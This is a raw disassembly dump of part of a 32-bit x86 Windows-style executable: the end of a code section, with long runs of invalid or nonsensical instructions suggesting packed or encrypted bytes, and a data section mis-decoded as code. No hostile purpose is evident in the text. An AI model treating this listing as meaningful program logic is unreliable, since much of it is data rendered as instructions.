  4112b8:	repnz fst DWORD PTR [eax+0x8aba718]
  4112bf:	push   edi
  4112c0:	data16 (bad) 
  4112c2:	mov    bh,0x89
  4112c4:	dec    edx
  4112c5:	iret   
  4112c6:	mov    esi,0x912657d9
  4112cb:	mov    esi,DWORD PTR [esi]
  4112cd:	add    ebx,DWORD PTR [esi]
  4112cf:	retf   
  4112d0:	lds    ebp,FWORD PTR [eax]
  4112d2:	imul   eax,ebx,0x89c80b4b
  4112d8:	jecxz  0x41128b
  4112da:	pusha  
  4112db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112dc:	bound  edi,QWORD PTR [edx-0x539d014]
  4112e2:	jne    0x411329
  4112e4:	or     DWORD PTR [eax+ebp*2-0x44],0xfffffff0
  4112e9:	shr    BYTE PTR [eax+0x78],1
  4112ec:	or     cl,ch
  4112ee:	pop    edi
  4112ef:	add    edx,ebp
  4112f1:	dec    ecx
  4112f2:	jp     0x41133e
  4112f4:	jne    0x4112d6
  4112f6:	or     BYTE PTR [esi+0x9b1abcd],bh
  4112fc:	jo     0x411334
  4112fe:	lea    esp,[ebp+0x32]
  411301:	mov    edi,eax
  411303:	popa   
  411304:	inc    esi
  411305:	mov    dl,dh
  411307:	xor    BYTE PTR [edi-0x2c],bh
  41130a:	(bad)  
  41130b:	nop
  41130c:	mov    ebx,0xbb148144
  411311:	xor    dh,BYTE PTR [ebp+0x55519451]
  411317:	imul   edi,esi,0xffffff81
  41131a:	test   eax,0xb896af9a
  41131f:	ror    DWORD PTR [ebx],cl
  411321:	fistp  WORD PTR [ebx+0x5bafce0f]
  411327:	push   0xa
  411329:	pop    ecx
  41132a:	push   0x4
  41132c:	pop    ebx
  41132d:	inc    ebx
  41132e:	xchg   ebx,ecx
  411330:	sub    ebx,ecx
  411332:	xchg   ebx,ecx
  411334:	dec    ecx
  411335:	mov    eax,DWORD PTR [ebp-0x1c]
  411338:	imul   eax,ecx
  41133b:	add    esp,eax
  41133d:	xchg   edx,eax
  41133e:	push   eax
  41133f:	xor    ebx,ebx
  411341:	mov    edx,esp
  411343:	jmp    0x41147e
  411348:	sub    BYTE PTR [edi+0x7165615e],cl
  41134e:	xor    ebx,DWORD PTR [ebp-0x7b]
  411351:	into   
  411352:	jge    0x411370
  411354:	pushf  
  411355:	adc    eax,0x434d5457
  41135a:	jl     0x4113d8
  41135c:	adc    bh,BYTE PTR [edi+0x7c]
  41135f:	jl     0x4113c6
  411361:	pusha  
  411362:	repz xor ecx,DWORD PTR [eax-0x71]
  411366:	(bad)  
  411368:	(bad)  
  411369:	es jnp 0x4113bc
  41136c:	xchg   ebp,eax
  41136d:	mov    edi,esp
  41136f:	jne    0x411304
  411371:	inc    esi
  411372:	lds    esp,FWORD PTR [edx]
  411374:	sub    edx,DWORD PTR [esi]
  411376:	xchg   ebx,eax
  411377:	xor    BYTE PTR [ebx-0x60],al
  41137a:	test   eax,0x2eb77384
  41137f:	mov    edx,DWORD PTR [edi-0x7a]
  411382:	fs aad 0x2c
  411385:	add    eax,0xb426e633
  41138a:	js     0x4113c9
  41138c:	xchg   BYTE PTR [ebx+0x1d6db462],dh
  411392:	pop    ss
  411393:	(bad)  
  411394:	sub    esp,DWORD PTR [ecx]
  411396:	xlat   BYTE PTR ds:[ebx]
  411397:	dec    ebx
  411398:	sub    eax,0xcacbc75f
  41139d:	xchg   ebx,eax
  41139e:	inc    si
  4113a0:	ja     0x4113cc
  4113a2:	cld    
  4113a3:	call   0xd316:0x7e5b0171
  4113aa:	dec    edi
  4113ab:	mov    WORD PTR [ebx],?
  4113ad:	dec    ebx
  4113ae:	int    0xd9
  4113b0:	inc    ebx
  4113b1:	or     esp,edi
  4113b3:	out    0xc4,al
  4113b5:	cli    
  4113b6:	mov    bh,0xfb
  4113b8:	fldenv [eax+ebp*1+0x6a8fa17b]
  4113c0:	push   es
  4113c1:	out    0x6a,eax
  4113c3:	lock or BYTE PTR [esi+0x7f5ed3aa],al
  4113ca:	mov    ebx,0x4363f466
  4113cf:	movlps QWORD PTR [edi+0x2],xmm0
  4113d3:	push   ds
  4113d4:	sbb    eax,0x39be7a53
  4113d9:	sub    dl,ch
  4113db:	stos   BYTE PTR es:[edi],al
  4113dc:	ret    0x7d30
  4113df:	xor    dl,ch
  4113e1:	adc    edx,DWORD PTR [ebp-0x58]
  4113e4:	out    0xcf,eax
  4113e6:	and    bh,0x34
  4113e9:	jp     0x411391
  4113eb:	cld    
  4113ec:	pop    ds
  4113ed:	imul   edi,esi,0x45741f3
  4113f3:	mov    eax,0x16dc225e
  4113f8:	into   
  4113f9:	fsubr  QWORD PTR fs:[edx+0x3cdfde9b]
  411400:	mov    eax,cs:0x610aa124
  411406:	add    eax,0xc5326c62
  41140b:	in     eax,0x9f
  41140d:	(bad)  
  41140e:	add    BYTE PTR [edi+0x68],bh
  411411:	les    ebx,FWORD PTR [edi-0x6897ff45]
  411417:	mov    edx,0x37fd7a1
  41141c:	mov    ch,0x8
  41141e:	fistp  WORD PTR [eax+0x215a9936]
  411424:	dec    edx
  411425:	stos   DWORD PTR es:[edi],eax
  411426:	stos   BYTE PTR es:[edi],al
  411427:	sti    
  411428:	push   edx
  411429:	dec    ch
  41142b:	mov    BYTE PTR [ecx],al
  41142d:	ins    DWORD PTR es:[edi],dx
  41142e:	lods   al,BYTE PTR ds:[esi]
  41142f:	inc    eax
  411430:	mov    ah,0xd1
  411432:	ret    0x7c9d
  411435:	aad    0x50
  411437:	jmp    0x9fd6a191
  41143c:	xor    al,ah
  41143e:	icebp  
  41143f:	nop
  411440:	arpl   WORD PTR [eax-0x3519604c],cx
  411446:	adc    ch,BYTE PTR [ebx-0x61]
  411449:	aam    0x5
  41144b:	movd   DWORD PTR [eax],mm4
  41144e:	jbe    0x411426
  411450:	dec    esi
  411451:	mov    BYTE PTR [ecx-0x78],bh
  411454:	fidivr DWORD PTR ds:0x8e983fe5
  41145a:	xchg   ebx,eax
  41145b:	and    ah,BYTE PTR [esi+0x75248137]
  411461:	pop    ebx
  411462:	mov    ds:0x43eb8e47,eax
  411467:	(bad)  
  411468:	cmp    eax,0xe321ac56
  41146d:	sbb    DWORD PTR [ecx+eax*1+0x16],edx
  411471:	rcl    esi,cl
  411473:	add    eax,0x7e6e11f0
  411478:	mov    ds,WORD PTR [edx+0x41]
  41147b:	int    0xbc
  41147d:	hlt    
  41147e:	dec    edx
  41147f:	inc    ebx
  411480:	add    ebx,DWORD PTR [edx+ebx*1]
  411483:	dec    ebx
  411484:	xor    edx,edx
  411486:	add    DWORD PTR [ebp-0xc],ebx
  411489:	pop    ebx
  41148a:	mov    eax,DWORD PTR [ebp-0xc]
  41148d:	pop    edi
  41148e:	pop    esi
  41148f:	pop    ebx
  411490:	leave  
  411491:	ret    0x10

Disassembly of section .data:

00412000 <.data>:
  412000:	and    BYTE PTR [ecx],ch
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    ch,BYTE PTR [ecx]
  412006:	add    DWORD PTR [eax],eax
  412008:	xor    al,0x29
  41200a:	add    DWORD PTR [eax],eax
  41200c:	inc    eax
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [edx+0x29],cl
  412012:	add    DWORD PTR [eax],eax
  412014:	pop    eax
  412015:	sub    DWORD PTR [ecx],eax
  412017:	add    BYTE PTR [edx+0x29],ah
  41201a:	add    DWORD PTR [eax],eax
  41201c:	je     0x412047
  41201e:	add    DWORD PTR [eax],eax
  412020:	jle    0x41204b
  412022:	add    DWORD PTR [eax],eax
  412024:	mov    WORD PTR [ecx],gs
  412026:	add    DWORD PTR [eax],eax
  412028:	xchg   esi,eax
  412029:	sub    DWORD PTR [ecx],eax
  41202b:	add    BYTE PTR [esi-0x4ffffed7],ah
  412031:	sub    DWORD PTR [ecx],eax
  412033:	add    BYTE PTR [ecx+ebp*1+0x29c60001],bh
  41203a:	add    DWORD PTR [eax],eax
  41203c:	aam    0x29
  41203e:	add    DWORD PTR [eax],eax
  412040:	loopne 0x41206b
  412042:	add    DWORD PTR [eax],eax
  412044:	jmp    0x129:0xf2000129
  41204b:	add    BYTE PTR [eax],al
  41204d:	sub    al,BYTE PTR [ecx]
  41204f:	add    BYTE PTR [edx],cl
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx+ebp*1],dl
  412056:	add    DWORD PTR [eax],eax
  412058:	and    ch,BYTE PTR [edx]
  41205a:	add    DWORD PTR [eax],eax
  41205c:	sub    al,0x2a
  41205e:	add    DWORD PTR [eax],eax
  412060:	xor    al,0x2a
  412062:	add    DWORD PTR [eax],eax
  412064:	inc    eax
  412065:	sub    al,BYTE PTR [ecx]
  412067:	add    BYTE PTR [edx+0x2a],cl
  41206a:	add    DWORD PTR [eax],eax
  41206c:	push   esp
  41206d:	sub    al,BYTE PTR [ecx]
  41206f:	add    BYTE PTR [esi+0x2a],bl
  412072:	add    DWORD PTR [eax],eax
  412074:	data16 sub al,BYTE PTR [ecx]
  412077:	add    BYTE PTR [eax+0x2a],dh
  41207a:	add    DWORD PTR [eax],eax
  41207c:	jp     0x4120a8
  41207e:	add    DWORD PTR [eax],eax
  412080:	sub    BYTE PTR [edx],0x1
  412083:	add    BYTE PTR [esi-0x65fffed6],cl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx-0x53fffed6],ah
  412091:	sub    al,BYTE PTR [ecx]
  412093:	add    BYTE PTR [edx+ebp*1+0x2ac00001],dh
  41209a:	add    DWORD PTR [eax],eax
  41209c:	retf   0x12a
  41209f:	add    ah,dl
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    dh,bl
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    dl,dh
  4120a9:	sub    al,BYTE PTR [ecx]
  4120ab:	add    dh,bh
  4120ad:	sub    al,BYTE PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [edx],bl
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [esi],ch
  4120b9:	sub    eax,DWORD PTR [ecx]
  4120bb:	add    BYTE PTR [esi],bh
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [ebx+ebp*1+0x1],cl
  4120c3:	add    BYTE PTR [eax+0x2b],bl
  4120c6:	add    DWORD PTR [eax],eax
  4120c8:	push   0x7e00012b
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [edx-0x59fffed5],dl
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    BYTE PTR [ebx+ebp*1+0x2bca0001],bh
  4120de:	add    DWORD PTR [eax],eax
  4120e0:	loopne 0x41210d
  4120e2:	add    DWORD PTR [eax],eax
  4120e4:	in     al,dx
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dh,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [esi],dl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [eax],ch
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],bh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [edx+0x2c],al
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	pop    eax
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [edx+0x2c],dh
  412102:	add    DWORD PTR [eax],eax
  412104:	jle    0x412132
  412106:	add    DWORD PTR [eax],eax
  412108:	mov    ch,BYTE PTR [ecx+eax*1]
  41210b:	add    BYTE PTR [esi-0x47fffed4],bl
  412111:	sub    al,0x1
  412113:	add    ah,al
  412115:	sub    al,0x1
  412117:	add    dl,dl
  412119:	sub    al,0x1
  41211b:	add    ah,ah
  41211d:	sub    al,0x1
  41211f:	add    al,dh
  412121:	sub    al,0x1
  412123:	add    BYTE PTR [esi],al
  412125:	sub    eax,0x2d140001
  41212a:	add    DWORD PTR [eax],eax
  41212c:	and    ch,BYTE PTR ds:0x2d300001
  412132:	add    DWORD PTR [eax],eax
  412134:	dec    edx
  412135:	sub    eax,0x2d5e0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	push   0x2d
  41213e:	add    DWORD PTR [eax],eax
  412140:	jp     0x41216f
  412142:	add    DWORD PTR [eax],eax
  412144:	xchg   esi,eax
  412145:	sub    eax,0x2da60001
  41214a:	add    DWORD PTR [eax],eax
  41214c:	mov    dh,0x2d
  41214e:	add    DWORD PTR [eax],eax
  412150:	(bad)  
  412151:	sub    eax,0x2dd20001
  412156:	add    DWORD PTR [eax],eax
  412158:	loop   0x412187
  41215a:	add    DWORD PTR [eax],eax
  41215c:	hlt    
  41215d:	sub    eax,0x2dfe0001
  412162:	add    DWORD PTR [eax],eax
  412164:	push   cs
  412165:	add    DWORD PTR cs:[eax],eax
  412168:	push   ds
  412169:	add    DWORD PTR cs:[eax],eax
  41216c:	sub    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	add    BYTE PTR [eax],al
  412172:	add    BYTE PTR [eax],al
  412174:	dec    edx
  412175:	add    DWORD PTR cs:[eax],eax
  412178:	add    BYTE PTR [eax],al
  41217a:	add    BYTE PTR [eax],al
  41217c:	push   0x8000012e
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	mov    WORD PTR [esi],gs
  412186:	add    DWORD PTR [eax],eax
  412188:	call   0x12e:0xb200012e
  41218f:	add    dh,al
  412191:	add    DWORD PTR cs:[eax],eax
  412194:	fsubr  QWORD PTR [esi]
  412196:	add    DWORD PTR [eax],eax
  412198:	call   0xf84122cb
  41219d:	add    DWORD PTR cs:[eax],eax
  4121a0:	adc    BYTE PTR [edi],ch
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	push   ds
  4121a5:	das    
  4121a6:	add    DWORD PTR [eax],eax
  4121a8:	xor    BYTE PTR [edi],ch
  4121aa:	add    DWORD PTR [eax],eax
  4121ac:	inc    eax
  4121ad:	das    
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	push   esi
  4121b1:	das    
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	data16 das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	jbe    0x4121e9
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	mov    ch,BYTE PTR [edi]
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	xchg   esi,eax
  4121c1:	das    
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121c5:	das    
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    dl,0x2f
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	enter  0x12f,0x0
  4121d0:	loopne 0x412201
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	hlt    
  4121d5:	das    
  4121d6:	add    DWORD PTR [eax],eax
  4121d8:	add    dh,BYTE PTR [eax]
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	sbb    BYTE PTR [eax],dh
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	xor    BYTE PTR cs:[ecx],al
  4121e3:	add    BYTE PTR [edx],bh
  4121e5:	xor    BYTE PTR [ecx],al
  4121e7:	add    BYTE PTR [eax+0x30],cl
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   edx
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi+0x30],ah
  4121f2:	add    DWORD PTR [eax],eax
  4121f4:	jbe    0x412226
  4121f6:	add    DWORD PTR [eax],eax
  4121f8:	mov    dh,BYTE PTR [eax]
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	pushf  
  4121fd:	xor    BYTE PTR [ecx],al
  4121ff:	add    BYTE PTR [eax-0x3bfffed0],dh
  412205:	xor    BYTE PTR [ecx],al
  412207:	add    ah,dl
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    dl,ch
  41220d:	xor    BYTE PTR [ecx],al
  41220f:	add    BYTE PTR [edx],al
  412211:	xor    DWORD PTR [ecx],eax
  412213:	add    BYTE PTR [edx],bl
  412215:	xor    DWORD PTR [ecx],eax
  412217:	add    BYTE PTR [esi],ah
  412219:	xor    DWORD PTR [ecx],eax
  41221b:	add    BYTE PTR [eax],bh
  41221d:	xor    DWORD PTR [ecx],eax
  41221f:	add    BYTE PTR [edx+0x31],cl
  412222:	add    DWORD PTR [eax],eax
  412224:	push   esi
  412225:	xor    DWORD PTR [ecx],eax
  412227:	add    BYTE PTR [eax+0x31],ch
  41222a:	add    DWORD PTR [eax],eax
  41222c:	jbe    0x41225f
  41222e:	add    DWORD PTR [eax],eax
  412230:	xor    BYTE PTR [ecx],0x1
  412233:	add    BYTE PTR [esi-0x59fffecf],dl
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [eax-0x2dfffecf],bh
  412241:	xor    DWORD PTR [ecx],eax
  412243:	add    dl,ch
  412245:	xor    DWORD PTR [ecx],eax
  412247:	add    BYTE PTR [eax],al
  412249:	add    BYTE PTR [eax],al
  41224b:	add    BYTE PTR [esi],al
  41224d:	xor    al,BYTE PTR [ecx]
  41224f:	add    BYTE PTR [edx+esi*1],bl
  412252:	add    DWORD PTR [eax],eax
  412254:	xor    dh,BYTE PTR [edx]
  412256:	add    DWORD PTR [eax],eax
  412258:	inc    edx
  412259:	xor    al,BYTE PTR [ecx]
  41225b:	add    BYTE PTR [edx+0x32],dl
  41225e:	add    DWORD PTR [eax],eax
  412260:	pusha  
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax+0x32],dh
  412266:	add    DWORD PTR [eax],eax
  412268:	test   BYTE PTR [edx],dh
  41226a:	add    DWORD PTR [eax],eax
  41226c:	xchg   esp,eax
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [eax-0x41fffece],ch
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    ah,cl
  412279:	xor    al,BYTE PTR [ecx]
  41227b:	add    al,ah
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    al,dh
  412281:	xor    al,BYTE PTR [ecx]
  412283:	add    BYTE PTR [edx],al
  412285:	xor    eax,DWORD PTR [ecx]
  412287:	add    BYTE PTR [edx],bl
  412289:	xor    eax,DWORD PTR [ecx]
  41228b:	add    BYTE PTR [esi],ah
  41228d:	xor    eax,DWORD PTR [ecx]
  41228f:	add    BYTE PTR [ebx+esi*1],dh
  412292:	add    DWORD PTR [eax],eax
  412294:	inc    esp
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [edx+0x33],dl
  41229a:	add    DWORD PTR [eax],eax
  41229c:	push   0x7a000133
  4122a1:	xor    eax,DWORD PTR [ecx]
  4122a3:	add    BYTE PTR [esi-0x6bfffecd],al
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi-0x4bfffecd],ah
  4122b1:	xor    eax,DWORD PTR [ecx]
  4122b3:	add    dh,al
  4122b5:	xor    eax,DWORD PTR [ecx]
  4122b7:	add    al,bl
  4122b9:	xor    eax,DWORD PTR [ecx]
  4122bb:	add    dl,ch
  4122bd:	xor    eax,DWORD PTR [ecx]
  4122bf:	add    dl,bh
  4122c1:	xor    eax,DWORD PTR [ecx]
  4122c3:	add    BYTE PTR [esi],al
  4122c5:	xor    al,0x1
  4122c7:	add    BYTE PTR [esp+esi*1],bl
  4122ca:	add    DWORD PTR [eax],eax
  4122cc:	cmp    BYTE PTR [ecx+eax*1],dh
  4122cf:	add    BYTE PTR [edx+0x34],dl
  4122d2:	add    DWORD PTR [eax],eax
  4122d4:	data16 xor al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1+0x1],dh
  4122db:	add    BYTE PTR [eax-0x6dfffecc],al
  4122e1:	xor    al,0x1
  4122e3:	add    BYTE PTR [edx-0x51fffecc],ah
  4122e9:	xor    al,0x1
  4122eb:	add    BYTE PTR [edx-0x37fffecc],bh
  4122f1:	xor    al,0x1
  4122f3:	add    al,ah
  4122f5:	xor    al,0x1
  4122f7:	add    al,dh
  4122f9:	xor    al,0x1
  4122fb:	add    BYTE PTR [eax],cl
  4122fd:	xor    eax,0x351a0001
  412302:	add    DWORD PTR [eax],eax
  412304:	sub    dh,BYTE PTR ds:0x35380001
  41230a:	add    DWORD PTR [eax],eax
  41230c:	dec    edx
  41230d:	xor    eax,0x35580001
  412312:	add    DWORD PTR [eax],eax
  412314:	fs xor eax,0x35720001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	jl     0x412353
  41231e:	add    DWORD PTR [eax],eax
  412320:	xchg   esp,eax
  412321:	xor    eax,0x35a40001
  412326:	add    DWORD PTR [eax],eax
  412328:	mov    ah,0x35
  41232a:	add    DWORD PTR [eax],eax
  41232c:	ret    0x135
  41232f:	add    al,dl
  412331:	xor    eax,0x35e00001
  412336:	add    DWORD PTR [eax],eax
  412338:	div    BYTE PTR ds:0x36080001
  41233e:	add    DWORD PTR [eax],eax
  412340:	push   ss
  412341:	add    DWORD PTR ss:[eax],eax
  412344:	sub    al,0x36
  412346:	add    DWORD PTR [eax],eax
  412348:	cmp    dh,BYTE PTR [esi]
  41234a:	add    DWORD PTR [eax],eax
  41234c:	push   edx
  41234d:	add    DWORD PTR ss:[eax],eax
  412350:	pop    esi
  412351:	add    DWORD PTR ss:[eax],eax
  412354:	push   0x36
  412356:	add    DWORD PTR [eax],eax
  412358:	jbe    0x412390
  41235a:	add    DWORD PTR [eax],eax
  41235c:	test   BYTE PTR [esi],dh
  41235e:	add    DWORD PTR [eax],eax
  412360:	xchg   esi,eax
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	mov    ds:0xb4000136,al
  412369:	add    DWORD PTR ss:[eax],eax
  41236c:	shl    BYTE PTR [esi],0x1
  41236f:	add    dh,cl
  412371:	add    DWORD PTR ss:[eax],eax
  412374:	fdiv   QWORD PTR [esi]
  412376:	add    DWORD PTR [eax],eax
  412378:	call   0xf64124b3
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	add    al,0x37
  412382:	add    DWORD PTR [eax],eax
  412384:	adc    al,0x37
  412386:	add    DWORD PTR [eax],eax
  412388:	es aaa 
  41238a:	add    DWORD PTR [eax],eax
  41238c:	cmp    al,0x37
  41238e:	add    DWORD PTR [eax],eax
  412390:	inc    esi
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	push   esp
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	fs aaa 
  41239a:	add    DWORD PTR [eax],eax
  41239c:	jbe    0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	test   BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	cwde   
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	mov    dl,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	les    esi,FWORD PTR [edi]
  4123ae:	add    DWORD PTR [eax],eax
  4123b0:	aam    0x37
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	call   0xfa4124f0
  4123b9:	aaa    
  4123ba:	add    DWORD PTR [eax],eax
  4123bc:	or     bh,BYTE PTR [eax]
  4123be:	add    DWORD PTR [eax],eax
  4123c0:	push   ss
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],dh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	inc    esi
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+edi*1+0x1],bl
  4123cf:	add    BYTE PTR [eax+0x38],bh
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	nop
  4123d5:	cmp    BYTE PTR [ecx],al
  4123d7:	add    BYTE PTR [eax+edi*1+0x38b00001],bl
  4123de:	add    DWORD PTR [eax],eax
  4123e0:	mov    edx,0xc8000138
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    ah,ah
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    dl,dh
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    BYTE PTR [esi],al
  4123f1:	cmp    DWORD PTR [ecx],eax
  4123f3:	add    BYTE PTR [eax],bl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [edx],ch
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [edx],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax+0x39],dl
  412402:	add    DWORD PTR [eax],eax
  412404:	cmp    WORD PTR [ecx],ax
	...
  41240f:	add    dh,cl
  412411:	add    al,cl
  412413:	dec    ebp
  412414:	add    BYTE PTR [eax],al
  412416:	add    BYTE PTR [eax],al
  412418:	add    al,BYTE PTR [eax]
  41241a:	add    BYTE PTR [eax],al
  41241c:	dec    ebp
  41241d:	add    BYTE PTR [eax],al
  41241f:	add    BYTE PTR [edx],bh
  412421:	cmp    al,BYTE PTR [ebx]
  412423:	add    BYTE PTR [edx],bh
  412425:	and    al,0x3
	...
  41242f:	add    dh,cl
  412431:	add    al,cl
  412433:	dec    ebp
  412434:	add    BYTE PTR [eax],al
  412436:	add    BYTE PTR [eax],al
  412438:	pop    esi
  412439:	and    al,0x1
  41243b:	add    BYTE PTR [ecx],al
  41243d:	add    BYTE PTR [eax],al
  41243f:	add    BYTE PTR [ecx],al
  412441:	add    BYTE PTR [eax],al
  412443:	add    BYTE PTR [ecx],al
  412445:	add    BYTE PTR [eax],al
  412447:	add    BYTE PTR [esp+0x1],dl
  41244b:	add    BYTE PTR [eax+0x24],bl
  41244e:	add    DWORD PTR [eax],eax
  412450:	pop    esp
  412451:	and    al,0x1
  412453:	add    BYTE PTR [esi+0x6f000032],al
  412459:	and    al,0x1
  41245b:	add    BYTE PTR [eax],al
  41245d:	add    BYTE PTR [esi+0x64],ch
  412460:	jae    0x4124d4
  412462:	bound  esp,QWORD PTR [esi+0x64]
  412465:	push   edi
  412466:	inc    si
  412468:	popa   
  412469:	xor    al,0x2e
  41246b:	je     0x4124dc
  41246d:	jo     0x41246f
  41246f:	aas    
  412470:	dec    eax
  412471:	imul   esp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  412479:	gs jb  0x4124cb
  41247c:	jb     0x4124e7
  41247e:	imul   ebp,DWORD PTR [bp+0x61],0x5940406c
  412486:	inc    edi
  412487:	inc    esi
  412488:	dec    ebx
  412489:	push   eax
  41248a:	inc    ecx
  41248b:	dec    ecx
  41248c:	push   eax
  41248d:	inc    ecx
  41248e:	inc    esp
  41248f:	cmp    al,0x56
	...
  412499:	add    BYTE PTR [eax],al
  41249b:	add    BYTE PTR [eiz*1+0x1],dl
  4124a2:	add    BYTE PTR [eax],al
  4124a4:	add    BYTE PTR [eax],al
  4124a6:	add    BYTE PTR [eax],al
  4124a8:	push   cs
  4124a9:	sub    eax,DWORD PTR [ecx]
  4124ab:	add    BYTE PTR [eax],al
  4124ad:	and    BYTE PTR [ecx],al
  4124af:	add    al,cl
  4124b1:	and    eax,0x1
  4124b6:	add    BYTE PTR [eax],al
  4124b8:	add    BYTE PTR [eax],al
  4124ba:	add    BYTE PTR [eax],al
  4124bc:	inc    eax
  4124bd:	add    DWORD PTR cs:[eax],eax
  4124c0:	mov    ah,0x20
  4124c2:	add    DWORD PTR [eax],eax
  4124c4:	mov    BYTE PTR [esi],ah
  4124c6:	add    DWORD PTR [eax],eax
	...
  4124d0:	pop    esp
  4124d1:	add    DWORD PTR cs:[eax],eax
  4124d4:	je     0x4124f7
  4124d6:	add    DWORD PTR [eax],eax
  4124d8:	nop
  4124d9:	add    DWORD PTR es:[eax],eax
	...
  4124e4:	clc    
  4124e5:	xor    DWORD PTR [ecx],eax
  4124e7:	add    BYTE PTR [ecx+eiz*1+0x1],bh
  4124eb:	add    BYTE PTR [eax+0x27],ah
  4124ee:	add    DWORD PTR [eax],eax
	...
  4124f8:	jb     0x412533
  4124fa:	add    DWORD PTR [eax],eax
  4124fc:	dec    esp
  4124fd:	and    al,BYTE PTR [ecx]
	...
  412513:	add    BYTE PTR [eax],ah
  412515:	sub    DWORD PTR [ecx],eax
  412517:	add    BYTE PTR [edx],ch
  412519:	sub    DWORD PTR [ecx],eax
  41251b:	add    BYTE PTR [ecx+ebp*1],dh
  41251e:	add    DWORD PTR [eax],eax
  412520:	inc    eax
  412521:	sub    DWORD PTR [ecx],eax
  412523:	add    BYTE PTR [edx+0x29],cl
  412526:	add    DWORD PTR [eax],eax
  412528:	pop    eax
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [edx+0x29],ah
  41252e:	add    DWORD PTR [eax],eax
  412530:	je     0x41255b
  412532:	add    DWORD PTR [eax],eax
  412534:	jle    0x41255f
  412536:	add    DWORD PTR [eax],eax
  412538:	mov    WORD PTR [ecx],gs
  41253a:	add    DWORD PTR [eax],eax
  41253c:	xchg   esi,eax
  41253d:	sub    DWORD PTR [ecx],eax
  41253f:	add    BYTE PTR [esi-0x4ffffed7],ah
  412545:	sub    DWORD PTR [ecx],eax
  412547:	add    BYTE PTR [ecx+ebp*1+0x29c60001],bh
  41254e:	add    DWORD PTR [eax],eax
  412550:	aam    0x29
  412552:	add    DWORD PTR [eax],eax
  412554:	loopne 0x41257f
  412556:	add    DWORD PTR [eax],eax
  412558:	jmp    0x129:0xf2000129
  41255f:	add    BYTE PTR [eax],al
  412561:	sub    al,BYTE PTR [ecx]
  412563:	add    BYTE PTR [edx],cl
  412565:	sub    al,BYTE PTR [ecx]
  412567:	add    BYTE PTR [edx+ebp*1],dl
  41256a:	add    DWORD PTR [eax],eax
